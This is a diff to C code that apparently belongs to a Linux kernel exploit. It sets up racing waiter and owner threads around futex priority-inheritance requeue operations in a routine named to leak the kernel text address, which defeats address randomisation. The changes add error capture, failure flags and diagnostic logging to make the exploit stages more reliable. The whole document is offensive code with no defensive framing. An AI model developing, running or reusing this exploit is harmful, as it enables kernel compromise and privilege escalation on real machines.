@@ -41,6 +41,8 @@ static uint32_t slide_f_pi_chain;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
+static atomic_int slide_waiter_failed;
+static atomic_int slide_owner_failed;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
 static atomic_int slide_consume_calls;
@@ -295,8 +297,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
-  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter lock chain errno=%d\n", errno);
+  errno = 0;
+  long lock_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0,
+                           NULL, NULL, 0);
+  int lock_errno = errno;
+  pr_info("slide waiter lock chain ret=%ld errno=%d\n",
+          lock_ret, lock_errno);
+  if (lock_ret != 0) {
+    atomic_store(&slide_waiter_failed, 1);
     return NULL;
   }
 
@@ -310,11 +318,18 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += SLIDE_WAIT_SECONDS;
 
   atomic_store(&slide_waiter_waiting, 1);
-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-           &slide_f_pi_target, 0);
-  pr_info("slide stage waiter woke after wait_req errno=%d\n", errno);
-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  pr_info("slide stage waiter unlocked chain errno=%d\n", errno);
+  errno = 0;
+  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                           &slide_f_pi_target, 0);
+  int wait_errno = errno;
+  pr_info("slide stage waiter woke after wait_req ret=%ld errno=%d\n",
+          wait_ret, wait_errno);
+  errno = 0;
+  long unlock_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0,
+                             NULL, NULL, 0);
+  int unlock_errno = errno;
+  pr_info("slide stage waiter unlocked chain ret=%ld errno=%d\n",
+          unlock_ret, unlock_errno);
 
   pr_info("slide stage waiter entering pselect\n");
   slide_pselect_stack_copy();
@@ -327,8 +342,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
-  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide owner lock target errno=%d\n", errno);
+  errno = 0;
+  long target_ret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0,
+                             NULL, NULL, 0);
+  int target_errno = errno;
+  pr_info("slide owner lock target ret=%ld errno=%d\n",
+          target_ret, target_errno);
+  if (target_ret != 0) {
+    atomic_store(&slide_owner_failed, 1);
     return NULL;
   }
 
@@ -337,8 +358,16 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
-  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-  pr_info("slide stage owner acquired chain errno=%d\n", errno);
+  errno = 0;
+  long chain_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0,
+                            NULL, NULL, 0);
+  int chain_errno = errno;
+  pr_info("slide stage owner chain returned ret=%ld errno=%d\n",
+          chain_ret, chain_errno);
+  if (chain_ret != 0) {
+    atomic_store(&slide_owner_failed, 1);
+    return NULL;
+  }
 
   for (;;) {
     sleep(1);
@@ -423,13 +452,28 @@ uint64_t slide_child_leak_stext(void) {
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started)) {
+    if (atomic_load(&slide_waiter_failed) ||
+        atomic_load(&slide_owner_failed)) {
+      pr_warning("slide setup failed waiter=%d owner=%d\n",
+                 atomic_load(&slide_waiter_failed),
+                 atomic_load(&slide_owner_failed));
+      atomic_store(&slide_consume_stop, 1);
+      return 0;
+    }
     usleep(1000);
   }
 
+  pr_info("slide pre-requeue waiter=%d owner=%d wait=%u target=%u chain=%u\n",
+          atomic_load(&slide_waiter_waiting),
+          atomic_load(&slide_owner_started),
+          slide_f_wait, slide_f_pi_target, slide_f_pi_chain);
+
   errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
-  pr_info("slide stage child did cmp_requeue errno=%d\n", errno);
+  long requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                              (void *)1, &slide_f_pi_target, 0);
+  int requeue_errno = errno;
+  pr_info("slide stage child did cmp_requeue ret=%ld errno=%d\n",
+          requeue_ret, requeue_errno);
 
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
